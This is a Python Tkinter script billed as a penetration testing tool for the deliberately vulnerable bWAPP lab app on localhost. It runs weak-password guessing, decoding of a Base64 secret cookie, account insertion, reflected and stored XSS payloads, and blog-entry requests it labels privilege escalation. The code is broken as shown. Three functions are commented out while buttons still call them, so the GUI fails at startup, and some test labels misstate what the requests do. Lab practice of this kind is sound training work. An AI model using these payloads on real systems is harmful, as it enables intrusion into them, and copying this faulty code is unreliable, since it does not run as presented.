import tkinter as tk
from tkinter import ttk
import requests
from base64 import b64decode
import urllib.parse
from bs4 import BeautifulSoup

# Function to log in and set the security level based on user selection
def login_and_set_security_level():
    global session, current_user  
    session = requests.Session()

    login_data = {
        "login": "bee",
        "password": "bug",
        "form": "submit"
    }
    response = session.post(login_url, data=login_data)

    if "Welcome" not in response.text:
        result_text.insert(tk.END, "Login failed.\n")
        return None

    current_user = "bee"
    user_label.config(text=f"User: {current_user}")

    selected_level = security_var.get()

    if selected_level == "low":
        security_data = {"security_level": "0", "form": "submit"}
        security_label.config(text="Security Level: Low")
    elif selected_level == "medium":
        security_data = {"security_level": "1", "form": "submit"}
        security_label.config(text="Security Level: Medium")
    else:
        security_data = {"security_level": "2", "form": "submit"}
        security_label.config(text="Security Level: High")

    response = session.post(security_url, data=security_data)

    if selected_level == "low" and "low" in response.text:
        pass
    elif selected_level == "medium" and "medium" in response.text:
        pass
    elif selected_level == "high" and "high" in response.text:
        pass
    else:
        result_text.insert(tk.END, "Failed to set the selected security level.\n")

    return session

# Function to print vulnerability information
def print_vulnerability(vuln_type, description, details):
    result_text.insert(tk.END, f"Vulnerability Type: {vuln_type}\n")
    result_text.insert(tk.END, f"Description: {description}\n")
    result_text.insert(tk.END, f"Details: {details}\n")
    result_text.insert(tk.END, "-" * 80 + "\n")

# Function to check if security level allows for exploitation
def check_security_level():
    selected_level = security_var.get()
    if selected_level in ["medium", "high"]:
        result_text.insert(tk.END, f"Security Level: {selected_level.capitalize()} - Exploit failed.\n")
        return False
    return True

# Function to test for weak passwords
def test_weak_passwords():
    result_text.delete(1.0, tk.END)
    if not check_security_level():
        return
    
    session = login_and_set_security_level()
    if not session:
        return
    
    default_username = "bee"
    weak_passwords = ["123456", "password", "12345678", "qwerty", "abc123","bug"]
    weak_password_found = False
    logout_url = f"{bwapp_url}/logout.php"

    for password in weak_passwords:
        login_data = {
            "login": default_username,
            "password": password,
            "form": "submit"
        }
        response = session.post(login_url, data=login_data)
        
        if "Welcome" in response.text:
            print_vulnerability("Weak Password Login", f"Weak password '{password}' accepted.", f"Username: {default_username}, Password: {password}")
            weak_password_found = True
            session.get(logout_url)  # Logout after successful login
            break

    if not weak_password_found:
        result_text.insert(tk.END, "No weak passwords were accepted for the default user.\n")

# Sensitive Data Exposure - Base64 Encoding
def exploit_base64_encoding():
    result_text.delete(1.0, tk.END)
    if not check_security_level():
        return
    
    session = login_and_set_security_level()
    if not session:
        return
    
    target_url = f"{bwapp_url}/insecure_crypt_storage_3.php"
    response = session.get(target_url)
    
    encoded_secret = session.cookies.get('secret')
    if encoded_secret:
        encoded_secret = urllib.parse.unquote(encoded_secret)
        decoded_secret = b64decode(encoded_secret).decode('utf-8')
        print_vulnerability("Base64 Encoding Exploit", "Decoded a Base64 encoded secret.", f"Decoded Secret: {decoded_secret}")
    else:
        print_vulnerability("Base64 Encoding Exploit", "Failed to decode secret.", "No secret found in cookies.")

# Sensitive Data Exposure - Text Files (Accounts)
def exploit_text_files_accounts():
    result_text.delete(1.0, tk.END)
    if not check_security_level():
        return
    
    session = login_and_set_security_level()
    if not session:
        return
    
    target_url = f"{bwapp_url}/insecure_crypt_storage_2.php"
    account_data = {
        'username': 'newuser',  # Change to desired username
        'password': 'newpassword',  # Change to desired password
        'insert': 'Insert'
    }
    response = session.post(target_url, data=account_data)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    success_message = soup.find('font', color='green')
    
    if success_message:
        print_vulnerability("Text Files (Accounts) Exploit", "Attempted to insert account data.", f"Server Response: {success_message.get_text()}")
    else:
        print_vulnerability("Text Files (Accounts) Exploit", "Failed to insert account data.", "No success message found.")

# XSS - Reflected XSS Test
def test_reflected_xss():
    result_text.delete(1.0, tk.END)
    if not check_security_level():
        return
    
    session = login_and_set_security_level()
    if not session:
        return
    
    xss_payloads = [
        ("firstname", "<script>alert('XSS1')</script>"),
        ("firstname", "<img src='x' onerror='alert(\"XSS2\")'>")
    ]
    
    for i, (param, payload) in enumerate(xss_payloads):
        target_url = f"{bwapp_url}/xss_get.php" if i == 0 else f"{bwapp_url}/xss_post.php"
        response = session.get(target_url, params={param: payload, "lastname": "Doe"}) if i == 0 else session.post(target_url, data={param: payload, "lastname": "Doe"})
        
        if payload in response.text:
            print_vulnerability("Reflected XSS", f"Vulnerable Parameter: {param}", f"Payload: {payload}")
        else:
            result_text.insert(tk.END, f"No vulnerability detected in Reflected XSS Test {i + 1}.\n")

# XSS - Stored XSS Test
def test_stored_xss():
    result_text.delete(1.0, tk.END)
    if not check_security_level():
        return
    
    session = login_and_set_security_level()
    if not session:
        return
    
    target_url = f"{bwapp_url}/xss_stored_1.php"
    xss_payload = "<script>alert('XSS3')</script>"
    data = {
        "entry": xss_payload,
        "entry_add": "on",
        "blog": "submit"
    }
    response = session.post(target_url, data=data)
    
    if xss_payload in response.text:
        print_vulnerability("Stored XSS", "Vulnerable Parameter: entry", f"Payload: {xss_payload}")
    else:
        result_text.insert(tk.END, "No vulnerability detected in Stored XSS Test.\n")

# Broken Access Control - Vertical Privilege Escalation
def test_vertical_privilege_escalation():
    result_text.delete(1.0, tk.END)
    if not check_security_level():
        return
    
    session = login_and_set_security_level()
    if not session:
        return
    
    target_url = f"{bwapp_url}/xss_stored_1.php"
    data = {
        'entry_delete': 'on',
        'form': 'submit'
    }
    response = session.post(target_url, data=data)
    
    if "All your entries were deleted!" in response.text:
        print_vulnerability("Vertical Privilege Escalation", "Attempted to delete another user's blog entry.", "Successfully deleted.")
    else:
        result_text.insert(tk.END, "No vertical privilege escalation detected.\n")

# Broken Access Control - Horizontal Privilege Escalation
def add_blog_entry(new_entry="This is an unauthorized modification."):
    result_text.delete(1.0, tk.END)
    if not check_security_level():
        return
    
    session = login_and_set_security_level()
    if not session:
        return
    
    add_entry_url = f"{bwapp_url}/xss_stored_1.php"
    data = {
        'entry': new_entry,
        'entry_add': 'on',
        'form': 'submit'
    }
    response = session.post(add_entry_url, data=data)
    
    if response.status_code == 200 and "Your entry was added" in response.text:
        print_vulnerability("Horizontal Privilege Escalation", "Updated another user's blog entry.", f"New Entry: {new_entry}")
    else:
        result_text.insert(tk.END, f"Failed to add blog entry. Status code: {response.status_code}\n")

# # Broken Access Control - Change Security Level
# def change_security_level(new_level="2"):  # Default to high (2)
#     result_text.delete(1.0, tk.END)
#     if not check_security_level():
#         return
    
#     session = login_and_set_security_level()
#     if not session:
#         return
    
#     set_level_url = f"{bwapp_url}/security_level_set.php"
#     data = {
#         'security_level': new_level,
#         'form': 'submit'
#     }
#     try:
#         response = session.post(set_level_url, data=data, timeout=10)
#         if response.status_code == 200 and "Current: <b>" in response.text:
#             print_vulnerability("Change Security Level", "Changed the security level of the application.", f"Security level changed to {new_level}.")
#             security_label.config(text=f"Security Level: {new_level}")
#         else:
#             result_text.insert(tk.END, f"Failed to change security level to {new_level}.\n")
#     except requests.exceptions.RequestException as e:
#         result_text.insert(tk.END, f"Request to change security level failed: {e}\n")

# # Broken Authentication - Brute Force Protection Bypass
# def test_brute_force_protection():
#     result_text.delete(1.0, tk.END)
#     if not check_security_level():
#         return
    
#     session = login_and_set_security_level()
#     if not session:
#         return
    
#     login_attempts = 10
#     login_data = {
#         "login": "bee",
#         "password": "wrongpassword",
#         "form": "submit"
#     }
#     success_attempts = 0

#     for attempt in range(1, login_attempts + 1):
#         response = session.post(login_url, data=login_data)
        
#         if "Account locked" in response.text or "Too many failed attempts" in response.text:
#             print_vulnerability("Brute Force Protection", "Account lockout or protection detected.", f"Locked after {attempt} attempts.")
#             break
#         elif "Welcome" in response.text:
#             success_attempts += 1
#             print_vulnerability("Brute Force Protection Bypass", "Successful login after multiple failed attempts.", f"Logged in on attempt {attempt} with incorrect password.")
#             session.get(f"{bwapp_url}/logout.php")  # Logout after successful login
#             break

#     if success_attempts == 0:
#         print_vulnerability("Brute Force Protection", "No account lockout detected after multiple failed attempts.", f"No brute force protection detected after {login_attempts} failed attempts.")

# # Broken Authentication - Session Management Issues (Session Fixation)
# def test_session_fixation():
#     result_text.delete(1.0, tk.END)
#     if not check_security_level():
#         return
    
#     session = login_and_set_security_level()
#     if not session:
#         return
    
#     session_cookie = session.cookies.get_dict().get("PHPSESSID", None)

#     if session_cookie:
#         print_vulnerability("Session Management", "Session ID is predictable or can be reused.", f"Session ID: {session_cookie}")
#     else:
#         result_text.insert(tk.END, "No session ID detected.\n")

    
# Initialize Tkinter GUI
root = tk.Tk()
root.title("Penetration Testing Tool")

# Set window size (width x height)
root.geometry("1200x800")  # Increased the window size

# Apply a theme for a modern look
style = ttk.Style()
style.theme_use('clam')  # You can try other themes like 'default', 'alt', 'classic', 'clam', 'vista', 'xpnative'

# bWAPP URL and credentials
bwapp_url = "http://localhost/bWAPP"
login_url = f"{bwapp_url}/login.php"
security_url = f"{bwapp_url}/security_level_set.php"

# Frame for results
result_frame = ttk.Frame(root)
result_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

result_label = ttk.Label(result_frame, text="Results", font=("Arial", 14, "bold"))
result_label.pack(anchor=tk.NW, padx=10, pady=5)

result_text = tk.Text(result_frame, height=40, width=100, wrap="word", padx=10, pady=10)  # Adjusted size for larger window
result_text.pack(anchor=tk.NW, fill=tk.BOTH, expand=True)

# Top-right labels for user and security level
top_frame = ttk.Frame(root)
top_frame.pack(side=tk.TOP, anchor=tk.NE, padx=10, pady=10)

user_label = ttk.Label(top_frame, text="User: N/A", font=("Arial", 12))
user_label.pack(anchor=tk.NE)

security_label = ttk.Label(top_frame, text="Security Level: N/A", font=("Arial", 12))
security_label.pack(anchor=tk.NE)

# Security Level Selection
security_var = tk.StringVar(value="low")
security_frame = ttk.Labelframe(root, text="Select Security Level", padding="10")
security_frame.pack(pady=10, padx=10)

low_radio = ttk.Radiobutton(security_frame, text="Low", variable=security_var, value="low")
low_radio.pack(anchor=tk.W)

medium_radio = ttk.Radiobutton(security_frame, text="Medium", variable=security_var, value="medium")
medium_radio.pack(anchor=tk.W)

high_radio = ttk.Radiobutton(security_frame, text="High", variable=security_var, value="high")
high_radio.pack(anchor=tk.W)

# GUI Components - Sensitive Data Exposure
sensitive_data_label = ttk.Label(root, text="Sensitive Data Exposure", font=("Arial", 14, "bold"))
sensitive_data_label.pack(pady=10)

base64_button = ttk.Button(root, text="Exploit Base64 Encoding", command=exploit_base64_encoding)
base64_button.pack(pady=5)

text_file_button = ttk.Button(root, text="Exploit Text Files (Accounts)", command=exploit_text_files_accounts)
text_file_button.pack(pady=5)

# GUI Components - XSS
xss_label = ttk.Label(root, text="XSS", font=("Arial", 14, "bold"))
xss_label.pack(pady=10)

reflected_xss_button = ttk.Button(root, text="Test Reflected XSS", command=test_reflected_xss)
reflected_xss_button.pack(pady=5)

stored_xss_button = ttk.Button(root, text="Test Stored XSS", command=test_stored_xss)
stored_xss_button.pack(pady=5)

# GUI Components - Broken Access Control
broken_access_control_label = ttk.Label(root, text="Broken Access Control", font=("Arial", 14, "bold"))
broken_access_control_label.pack(pady=10)

vertical_privilege_button = ttk.Button(root, text="Test Vertical Privilege Escalation", command=test_vertical_privilege_escalation)
vertical_privilege_button.pack(pady=5)

horizontal_privilege_button = ttk.Button(root, text="Test Horizontal Privilege Escalation", command=add_blog_entry)
horizontal_privilege_button.pack(pady=5)

change_security_level_button = ttk.Button(root, text="Change Security Level", command=change_security_level)
change_security_level_button.pack(pady=5)

# GUI Components - Broken Authentication
broken_auth_label = ttk.Label(root, text="Broken Authentication", font=("Arial", 14, "bold"))
broken_auth_label.pack(pady=10)

weak_password_button = ttk.Button(root, text="Test Weak Passwords", command=test_weak_passwords)
weak_password_button.pack(pady=5)

brute_force_button = ttk.Button(root, text="Test Brute Force Protection", command=test_brute_force_protection)
brute_force_button.pack(pady=5)

session_fixation_button = ttk.Button(root, text="Test Session Fixation", command=test_session_fixation)
session_fixation_button.pack(pady=5)

# Start the GUI loop
root.mainloop()
